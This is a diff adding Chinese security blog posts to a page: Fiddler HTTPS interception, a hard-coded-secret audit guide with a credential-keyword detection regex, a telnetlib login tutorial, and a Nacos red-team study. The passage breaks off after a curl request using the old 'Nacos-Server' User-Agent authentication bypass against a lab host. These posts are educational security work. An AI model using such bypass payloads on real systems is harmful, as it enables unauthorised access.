@@ -86,6 +86,542 @@
 
     
         <h2 class="title">
+            <a href="/2023/09/02/Fiddler-HTTPS/">
+                Fiddler设置解密https的网络数据
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="fiddler设置解密https的网络数据">Fiddler设置解密https的网络数据</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38914978/article/details/104801629">Admirer_joker</a> 并作补充</p>
+</blockquote>
+<h2><span id="原理">原理</span></h2><blockquote>
+<p>Fiddler可以通过伪造CA证书来欺骗了浏览器和https服务器。大致原理就是在浏览器面前fiddler伪装成为一个https服务器，而在真正的https服务器面前fiddler又伪装成为浏览器，从而实现解密https数据包的目的；</p>
+</blockquote>
+<h2><span id="步骤">步骤</span></h2><blockquote>
+<p>解密https需要手动开启，步骤如下：</p>
+</blockquote>
+<h3><span id="1-tools-gt-fiddler-options-gt-https">1. Tools –&gt; Fiddler Options –&gt; HTTPS</span></h3><h3><span id="2-打开options-https后如图">2. 打开options-https后，如图：</span></h3><blockquote>
+<p><img src="/2023/09/02/Fiddler-HTTPS/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/09/02/Fiddler-HTTPS/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/09/02/Fiddler-HTTPS/3.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Fiddler/" rel="tag">Fiddler</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/07/24/Hard-Coding/">
+                敏捷代码审计之代码硬编码
+            </a>
+        </h2>
+    
+    <time>
+        Jul 24, 2023
+    </time>
+    <section class="content">
+        <h1><span id="敏捷代码审计之代码硬编码">敏捷代码审计之代码硬编码</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://hksanduo.github.io/2022/09/09/2022-09-09-harder-coding-scan/">Sanduo</a> 并作补充</p>
+</blockquote>
+<h2><span id="介绍">介绍</span></h2><blockquote>
+<p>硬编码（英语：Hard Code或Hard Coding）是指在软件编码过程中，将输出或输入的相关参数（例如：路径、输出的形式或格式）直接以常量的方式撰写在源代码中，而非在执行期间由外界指定的设置、资源、资料或格式做出适当回应。一般被认定是种反模式或不完美的实现，因为软件受到输入资料或输出格式的改变就必须修改源代码，对客户而言，改变源代码之外的小设置也许还比较容易。但硬编码的状况也并非完全只有缺陷，因某些封装需要或软件本身的保护措施，有时是必要的手段。除此之外，有时候因应某些特殊的需求，制作出简单的应用程序，应用程序可能只会执行一次或者有限的几次，或者永远只应付某种单一需求。<br>所谓硬编码，就是把一个本来应该（可以）写到配置信息中的信息直接在程序代码中写死了。密钥硬编码在代码中，而根据密钥的用途不同，这导致了不同的安全风险，有的导致加密数据被破解，数据不再保密，有的导致和服务器通信的加签被破解，引发各种血案。</p>
+</blockquote>
+<h2><span id="硬编码检测方法">硬编码检测方法</span></h2><blockquote>
+<p>方法论主要参考：密码密钥硬编码检查，参考链接详见文章末尾。</p>
+</blockquote>
+<h3><span id="鉴别密码密钥方法">鉴别密码密钥方法</span></h3><h4><span id="香农熵shannon-entropy">香农熵(Shannon entropy)</span></h4><blockquote>
+<p>密钥的长度决定了密钥空间(keyspace），通常以位为单位。密钥空间越大，密钥被攻破的难度就越大。<br>密钥是由密钥空间的随机值构成。对于任意一个随机变量 X，它的熵定义如下：</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Hard-Coding/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>变量的不确定性越大，熵也就越大，把它搞清楚所需要的信息量也就越大。</p>
+<ul>
+<li>P(x_i)P(xi) : 指的是单个样本变量所属的变量种类的个数占据所有变量个数的比例。同等长度的字符串，通常密钥的熵值更高</li>
+<li>密钥为避免彩虹攻击，在取值上更加的离散，会尽量采用不重复的字符。就像我们为了增加密码的复杂性，要求长度不小于8，必须包含大小写、特殊字符、以及数字一样的道理。所以密钥的熵值会比一般的文本要高的多。我们就是利用这点来识别字符串是否是密钥。</li>
+</ul>
+</blockquote>
+<h3><span id="工具的检查逻辑">工具的检查逻辑</span></h3><blockquote>
+<p>对于密码密钥的硬编码检查可以采用静态分析工具来完成。工具的检查过程通常包含四个过程：输入文件准备、检查、过滤和报告输出。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Hard-Coding/2.png" alt="image"></p>
+</blockquote>
+<h4><span id="输入文件分类">输入文件分类</span></h4><blockquote>
+<p>我们需要检查的文本文件进行分类，通常包括以下几种类型：</p>
+<ul>
+<li>程序语言：C、C++、Java、Python、Go、Js等；</li>
+<li>有统一格式的文件：属性文件、yaml、csv、json、xml等；</li>
+<li>文本文件：没有固定格式的文本文件。<br>分类的目的是为了更好的识别文件中的字符串常量，充分利用字符串常量的上下文关联，以便在分析中最大程度的减少误报。</li>
+</ul>
+</blockquote>
+<h4><span id="输入文件转换">输入文件转换</span></h4><blockquote>
+<ul>
+<li>程序语言：通过各语言的语法解析器，解析成抽象语法树，提取语法树中的等于字符串的常量，以及对应的变量名；</li>
+<li>有统一格式的文件：照格式转换成变量名和字符串常量值；</li>
+<li>文本文件：采用token的方式分割成一个个的token，变成一个各的字符串常量。</li>
+</ul>
+</blockquote>
+<h4><span id="密码密钥检查">密码密钥检查</span></h4><blockquote>
+<p>在我们得到大量的变量名和字符串常量后，主要通过正则表达式匹配的方式完成目标的筛选。我们收集的密钥格式包括国内国外主流平台、SDK等相关系统的密钥配置参数名称，可以根据客户的实际情况手动增加和优化规则，进而提高检测的速度和效率。<br>由于检查密码密钥的种类和类型不同，可以通过配置文件来提高检查能力的可扩展性。<br>检查配置选项主要包括以下内容：</p>
+</blockquote>
+<p>|信息	|描述	|<br>|检查类型	|可分为：变量名、字符串常量、或两个都检查	|<br>|密码密钥的类型	|用于区分不同类型的密码密钥；同时用于告警时区分具体检测到的密码密钥类型	|<br>|正则表达式	|主要设定匹配的长度，每个字符的可选类型	|<br>|熵值的阈值	|用于精确的识别密码密钥的类型，降低误报	|</p>
+<blockquote>
+<p>例如：<br>检查硬编码的口令：检查变量名中包含：password、passwd、pwd的变量，且变量等于字符串常量；正则表达式可以设置成为：”.*(password|passwd|pwd)$”。<br>检查GitHub的个人凭证：检查字符串常量；这个凭证是以”ghp_”开头的，跟随长度为36的字符串，且每个字符可以为数字和字母；正则表达式可以设置成为：“ghp_[0-9a-zA-Z]{36}”。</p>
+</blockquote>
+<h4><span id="密码密钥过滤">密码密钥过滤</span></h4><blockquote>
+<p>静态分析能很大程度上减少了人工审核的工作量，但由于检查模式的不确定性，也会带来不少的误报。误报会给用户在审核过程中带来很大的负面情绪，从而不愿继续使用工具。为了进一步降低误报，我们可以通过下面的方式来降低误报：</p>
+<ul>
+<li>密码密钥熵值的计算<br>前面讨论过密码密钥的特点，可以通过检测密码密钥的信息熵的方式来降低误报。有些密码密钥设定了最低的阈值，但还是有很多密码密钥并未给出具体的阈值，这个就需要通过经验积累来设定，目前业界也有通过机器学习来完善这个阈值的设定。</li>
+<li>污点分析<br>在代码中，对于口令的变量的取名上，很多并不会遵守可读性和可维护性来设定变量名，通过前面正则表达式的方式来查找硬编码密码的方式，会造成很多的漏报。这里还可以通过污点分析的方法，来推导出密码是否采用了硬编码。例如检查jdbc连接的密码参数，查看该参数是否为字符串常量。</li>
+</ul>
+</blockquote>
+<h4><span id="报告输出">报告输出</span></h4><blockquote>
+<p>将经过过滤后的结果，输出告警，给出可能泄露的文件名和变量或可能为密码密钥的常量字符串位置，便于人工的排查。</p>
+</blockquote>
+<h2><span id="硬编码检测实战">硬编码检测实战</span></h2><blockquote>
+<p>对于审计人员或者安全管理人员并不需要关注密钥检查的算法，通常只需要选用合适的流程，匹配恰当的工具，迅速准确的定位硬编码即可。</p>
+</blockquote>
+<h3><span id="检查的流程">检查的流程</span></h3><blockquote>
+<p>信息收集：此阶段中，审计人员进行必要的信息收集，包括本次审计要求、稳定版本的源代码。<br>工具审计：确定工具审计的标准和各项配置参数，使用Fortify、gitleaks等工具检测目标源代码，对工具检测的结果进行人工核查，筛选，分析，汇总。<br>人工审计：对客户要求人工审计的重点代码采用人工分析的方法，对源代码中的硬编码进行审计。<br>综合汇总：将工具审计和人工审计的结果进行对比汇总<br>输出报告：此阶段中，审计人员根据测试的结果编写直观的硬编码审计服务报告。<br>源代码硬编码审计要求工作人员有丰富的经验及新颖的思路，同时也是一项比较耗费时间和资源的工作，从效率考虑，一般选择性的抽取部分重要环节的代码进行人工审计。</p>
+</blockquote>
+<h3><span id="开源检查工具">开源检查工具</span></h3><h4><span id="secretscanner">SecretScanner</span></h4><blockquote>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/deepfence/SecretScanner">https://github.com/deepfence/SecretScanner</a><br>SecretScanner可以扫描主机上的容器镜像或本地目录，主要通过正则匹配，扫描效率较高，不仅支持代码而且支持容器扫描，并将结果输出到JSON文件，其中会包含SecretScanner找到的所有敏感数据的详细信息。<br>SecretScanner方便安全人员在主机上收集敏感数据，如果需要审计特定类型代码或者增加新的硬编码检测点，需要手动修改规则，默认配置文件位于项目中的config.yaml，可以根据实际情况自行修改。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Hard-Coding/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>不足：规则数量一般</p>
+</blockquote>
+<h4><span id="gitleaks">gitleaks</span></h4><blockquote>
+<p>Gitleaks为你提供了一种方法来扫描你的git存储库，以查找这些不需要的数据，这些数据应该是私有的，扫描可以自动化，以完全适合CI&#x2F;CD工作流程，以便在密码识别更深入到代码库之前进行识别。<br>gitleaks比较有趣的有以下几点：</p>
+<ul>
+<li>支持私有存储库扫描以及需要基于密钥的身份验证的存储库。</li>
+<li>支持Gitlab批量组织和存储库所有者（用户）存储库扫描，并提取请求扫描以在常见CI工作流中使用。</li>
+<li>支持Pre-Commit，方便研发人员在提交之前进行硬编码检测，防止敏感信息提交。</li>
+<li>支持使用git log命令验证由gitleaks找到的发现</li>
+</ul>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Hard-Coding/4.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>不足：对普通用户友好程度一般，对于pre-commit需要手动配置，并且在大文件扫描效率较低，官方已移除多线程配置参数，使用默认线程数进行扫描，如果在使用过程中感觉缓慢，可自行设定编译。同样规则数量一般，可以根据实际情况添加。</p>
+</blockquote>
+<h4><span id="sasts">SASTs</span></h4><blockquote>
+<p>各种SAST工具都可以检测硬编码，但是受限于使用场景，只能检测较少的硬编码场景，比如password，key等，对于特定的硬编码需要手动增加规则，规则友好性一般。</p>
+</blockquote>
+<h3><span id="硬编码检测规则">硬编码检测规则</span></h3><blockquote>
+<p>无论gitleaks还是secretScanner，均使用正则匹配相关硬编码，敏感信息，我这里整理出部分敏感信息参数，供大家参考，至于规则，按照要求，自行补充即可，比较简单，这里就不单独描述了</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regex: <span class="string">&#x27;(?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]&#123;0,25&#125;)(=|&gt;|:=|\|\|:|&lt;=|=&gt;|:).&#123;0,5&#125;[\&quot;]([0-9a-zA-Z\-_=]&#123;8,64&#125;)[\&quot;]&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<h2><span id="参考">参考</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://developer.huawei.com/consumer/cn/forum/topic/0204931065040020698?fid=0101592429757310384">密码密钥硬编码检查</a><br><a target="_blank" rel="noopener" href="https://github.com/deepfence/SecretScanner">SecretScanner</a><br><a target="_blank" rel="noopener" href="https://github.com/zricethezav/gitleaks">gitleaks</a><br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Android%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%85%E8%B0%88%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81.html">浅谈密钥硬编码</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/07/24/Python-Telnet/">
+                Python telnet模块说明
+            </a>
+        </h2>
+    
+    <time>
+        Jul 24, 2023
+    </time>
+    <section class="content">
+        <h1><span id="python-telnet模块说明">Python telnet模块说明</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41629756/article/details/102784236">三番鱼</a> 并作补充</p>
+</blockquote>
+<h2><span id="程序要点说明">程序要点说明</span></h2><blockquote>
+<p>python实现telnet客户端的六个关键问题及其答案是：<br>使用什么库实现telnet客户端—-telnetlib</p>
+</blockquote>
+<blockquote>
+<p>1.怎么连接主机—-两种方法，一种是在实例化时传入ip地址连接主机（tn &#x3D; telnetlib.Telnet(host_ip,port&#x3D;23)），第二种是，先不传参数进行实例化再用open方法连接主机（我这里使用的方法）</p>
+</blockquote>
+<blockquote>
+<p>2.怎么输入用户名密码—-我们使用read_untilb函数监听，出现标志后使用write方法向服务端传输用户名密码</p>
+</blockquote>
+<blockquote>
+<p>3.怎么执行命令—-仍然是使用write方法向服务端传送命令，不管向服务端传送什么数据都用write；不过要注意需要编码成bytes类型<br>注：该Telnet.write()函数采用字节字符串。这可以通过仅编码字符串（您尝试编码函数的返回值）来提供，例如：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.write(<span class="string">&quot;administrator\n&quot;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者通过为字符串添加前缀b如下：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"> </span><br><span class="line">host = <span class="string">&quot;192.168.1.0&quot;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">timeout = <span class="number">100</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> telnetlib.Telnet(host, port, timeout) <span class="keyword">as</span> session:</span><br><span class="line">    session.write(<span class="string">b&quot;administrator\n&quot;</span>)</span><br><span class="line">    session.write(<span class="string">b&quot;password\n&quot;</span>)</span><br><span class="line">    session.write(<span class="string">b&quot;reboot\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>4.怎么获取命令执行结果—-使用read_very_eager()方法，该方法获取的内容是上次获取之后本次获取之前的所有输入输出；由于获取到的是bytes类型要decode解码一下</p>
+</blockquote>
+<blockquote>
+<p>5.怎么退出telnet—退出telnet使用write方法向服务器提交exit命令即可</p>
+</blockquote>
+<h2><span id="程序源码清单">程序源码清单</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelnetClient</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,</span>):</span><br><span class="line">        self.tn = telnetlib.Telnet()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 此函数实现telnet登录主机</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login_host</span>(<span class="params">self,host_ip,username,password</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># self.tn = telnetlib.Telnet(host_ip,port=23)</span></span><br><span class="line">            self.tn.<span class="built_in">open</span>(host_ip,port=<span class="number">23</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s网络连接失败&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 等待login出现后输入用户名，最多等待10秒</span></span><br><span class="line">        self.tn.read_until(<span class="string">b&#x27;login: &#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        self.tn.write(username.encode(<span class="string">&#x27;ascii&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 等待Password出现后输入用户名，最多等待10秒</span></span><br><span class="line">        self.tn.read_until(<span class="string">b&#x27;Password: &#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        self.tn.write(password.encode(<span class="string">&#x27;ascii&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 延时两秒再收取返回结果，给服务端足够响应时间</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 获取登录结果</span></span><br><span class="line">        <span class="comment"># read_very_eager()获取到的是的是上次获取之后本次获取之前的所有输出</span></span><br><span class="line">        command_result = self.tn.read_very_eager().decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Login incorrect&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> command_result:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s登录成功&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s登录失败，用户名或密码错误&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 此函数实现执行传过来的命令，并输出其执行结果</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_some_command</span>(<span class="params">self,command</span>):</span><br><span class="line">        <span class="comment"># 执行命令</span></span><br><span class="line">        self.tn.write(command.encode(<span class="string">&#x27;ascii&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 获取命令结果</span></span><br><span class="line">        command_result = self.tn.read_very_eager().decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        logging.warning(<span class="string">&#x27;命令执行结果：\n%s&#x27;</span> % command_result)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 退出telnet</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">logout_host</span>(<span class="params">self</span>):</span><br><span class="line">        self.tn.write(<span class="string">b&quot;exit\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host_ip = <span class="string">&#x27;192.168.220.129&#x27;</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;abcd1234&#x27;</span></span><br><span class="line">    command = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">    telnet_client = TelnetClient()</span><br><span class="line">    <span class="comment"># 如果登录结果返加True，则执行命令，然后退出</span></span><br><span class="line">    <span class="keyword">if</span> telnet_client.login_host(host_ip,username,password):</span><br><span class="line">        telnet_client.execute_some_command(command)</span><br><span class="line">        telnet_client.logout_host()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>python 库 telnetlib: Telnet客户端:<br>telnetlib模块提供的Telnet类实现了Telnet协议。它为协议字符和telnet选项提供符号常量，符号常量来源于arpa&#x2F;telnet.h去掉了前缀TELOPT_</p>
+<p>1.Telnet.read_all(): 读取所有数据直到EOF，阻塞直到连接关闭<br>2.Telnet.read_some(): 读取至少一个字节的数据，除非EOF。如果没有数据则阻塞。<br>3.Telnet.read_until(expected[, timeout]):常用于登录，与write连用；读取直到遇到了给定的字符串expected或超时秒数<br>4.Telnet.read_very_eager(): 非阻塞地读取。连接关闭或者没有数据时触发EOFError异常，返回b’’如果没有数据。 获取命令执行结果：获取的内容是上次获取之后本次获取之前的所有输入输出<br>5.Telnet.read_eager(): 读取已有数据(快)<br>6.Telnet.read_lazy(): 读取已有数据(懒)<br>7.Telnet.read_sb_data(): 返回的SB&#x2F;SE pair(suboption begin&#x2F;end)之间的数据，此方法永远不会阻塞<br>8.Telnet.open(host[,port[,timeout]]): 连接到主机，可选的第二个参数是默认为标准的Telnet端口（23）的端口号。可选的超时参数（以秒指定）阻塞操作（如连接尝试超时（如果不指定，默认使用全局超时设置））<br>9.Telnet.msg(msg[, *args]): 当调试级别为&gt;0打印调试信息<br>10.Telnet.set_debuglevel(debuglevel)：设置调试级别。debuglevel越高信息越多。<br>11.Telnet.close() 关闭连接<br>12.Telnet.get_socket()：返回套接字供内部使用<br>13.Telnet.fileno(): 返回套接字对象内部使用的文件描述<br>14.Telnet.write(buffer): 常用于执行命令；写入字符串到套接字，加倍IAC的任何字符。连接关闭时可能触发OSError异常。<br>15.Telnet.interact(): 交由用户控制<br>16.Telnet.mt_interact(): 多线程版本的interact()<br>17.Telnet.expect(list[, timeout]): 读取直到匹配正则表达式项列表中的一个。list是一个正则表达式列表，包含编译(regx对象)或未编译（字节字符串）。timeout以秒为单位，默认值为无限期阻塞。返回元祖的三个项目：</p>
+<ul>
+<li>1.index为匹配正则表达式的位置；</li>
+<li>2.match对象</li>
+<li>3.此时读了的字节<br>18.Telnet.set_option_negotiation_callback(callback):每次从输入流读取telnet选项时，调用callback,后续步骤不会执行。</li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Python/" rel="tag">Python</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Telnetlib/" rel="tag">Telnetlib</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/07/24/Nacos-AccessToken/">
+                云原生组件Nacos新型红队手法研究
+            </a>
+        </h2>
+    
+    <time>
+        Jul 24, 2023
+    </time>
+    <section class="content">
+        <h1><span id="云原生组件nacos新型红队手法研究">云原生组件Nacos新型红队手法研究</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ">Zhuri</a> 并作补充</p>
+</blockquote>
+<h2><span id="组件简介">组件简介</span></h2><blockquote>
+<p>Nacos &#x2F;nɑ:kəʊs&#x2F; 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。<br>Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。<br>Nacos 帮助您更敏捷和容易地构建、交付和管理微服务平台。Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。</p>
+</blockquote>
+<h2><span id="历史漏洞">历史漏洞</span></h2><blockquote>
+<p>2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。<br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/1105">https://github.com/alibaba/nacos/issues/1105</a><br>在Nacos 2.0版本存在未授权访问漏洞，程序未有效对于用户权限进行判断，导致能够添加任意用户、修改任意用户密码等等问题。<br>这里就不做过多介绍了，网上有很多。<br>就在我撰写本文的时候，官方刚刚发布了最新的版本2.2.0 (Dec 14, 2022)，我们就来一探究竟。</p>
+</blockquote>
+<h2><span id="部署方式">部署方式</span></h2><blockquote>
+<p>为了方便起见，我这里使用Debian系统并采用的单机部署的方式。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install default-jdk</span><br><span class="line">sudo ufw <span class="built_in">disable</span></span><br><span class="line">wget https://github.com/alibaba/nacos/releases/download/2.2.0/nacos-server-2.2.0.zip</span><br><span class="line">unzip nacos-server-2.2.0.zip</span><br><span class="line"><span class="built_in">cd</span> nacos/bin</span><br><span class="line">bash startup.sh -m standalone</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>然后访问<a target="_blank" rel="noopener" href="http://ip:8848/nacos%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%87%BA%E7%8E%B0%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%B0%B1%E8%AF%B4%E6%98%8E%E9%83%A8%E7%BD%B2%E6%88%90%E5%8A%9F%E4%BA%86%EF%BC%8C%E9%BB%98%E8%AE%A4%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%B8%BAnacos/nacos%E3%80%82">http://ip:8848/nacos，如果出现登录界面，就说明部署成功了，默认的账号密码为nacos/nacos。</a></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>我们首先尝试使用老版本的payload尝试能不能打。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>不出意外，返回:</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">caused: Parameter conditions <span class="string">&quot;search=blur&quot;</span> OR <span class="string">&quot;search=accurate&quot;</span> not met <span class="keyword">for</span> actual request parameters: pageNo=&#123;1&#125;, pageSize=&#123;9&#125;;%</span><br></pre></td></tr></table></figure>
+
+<blockquote>
